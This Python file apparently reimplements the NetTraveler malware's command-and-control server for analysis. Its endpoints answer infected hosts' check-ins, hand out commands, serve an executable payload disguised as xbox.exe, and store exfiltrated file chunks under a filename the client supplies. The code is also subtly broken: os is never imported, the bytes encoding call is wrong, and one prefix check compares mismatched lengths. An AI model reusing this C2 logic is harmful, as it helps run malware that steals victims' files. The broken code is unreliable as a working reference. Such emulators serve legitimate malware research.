################################################################################
## Copyright 2015 Christian Roggia. All rights reserved.                      ##
## Use of this source code is governed by an Apache 2.0 license that can be   ##
## found in the LICENSE file.                                                 ##
################################################################################

from http.server import BaseHTTPRequestHandler, HTTPServer

PORT_NUMBER = 8000

class CCRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/?action=getdata":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("XXXXXXXX:UPLOAD", 'utf-8'))
        elif self.path == "/?action=datasize":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("Success:XXXXXX", 'utf-8'))
            #self.wfile.write("Success:0")
        elif self.path == "/../xbox.exe" or self.path == "/xbox.exe":
            self.send_response(200)
            self.send_header('Content-type','application/x-msdownload')
            self.end_headers()
            
            f = open("update.exe", "rb") 
            self.wfile.write(bytes(f.read(), 'utf-8'))
            f.close()
        elif self.path == "/?action=updated&hostid=XXXXXXXX":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("", 'utf-8'))
        elif self.path == "/?action=getcmd&hostid=XXXXXXXX&hostname=XXXX":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("[CmdBegin]\r\nTEST CONFIG\r\n[CmdEnd]\r\n", 'utf-8'))
        elif self.path == "/?action=gotcmd&hostid=XXXXXXXX&hostname=XXXX":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("Success", 'utf-8'))
        elif self.path[:43] == "/?hostid=XXXXXXXX&hostname=XXXX&hostip=":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            sent_filename = ""
            sent_filestart = -1
            sent_filetext = ""
            
            url_args = (self.path[2:]).split("&")
            for i in url_args:
                if i[:9] == "filename=":
                    sent_filename = i[9:]
                elif i[:10] == "filestart=":
                    sent_filestart = int(i[10:])
                elif i[:9] == "filetext=":
                    sent_filetext = i[9:]
            
            if sent_filename == "" or sent_filestart == -1 or sent_filetext == "":
                self.wfile.write(bytes("Success:0", 'utf-8'))
            
            f = open(sent_filename, "a")
            f.write(sent_filetext)
            f.close()
            
            self.wfile.write(bytes("Success:%d" % (sent_filestart + 1024), 'utf-8'))
        else:
            self.send_response(404)
            self.send_header('Content-type','text/html')
            self.end_headers()
            
            self.wfile.write(bytes("404: Not found.", 'utf-8'))

if __name__ == "__main__":
    os.system('cls')
    
    # NOTE: This is only an example, no real functionality is provided
    server = HTTPServer(('127.0.0.1', PORT_NUMBER), CCRequestHandler)
    print('Started [NetTraveler C&C] on port %u' % PORT_NUMBER)

    server.serve_forever()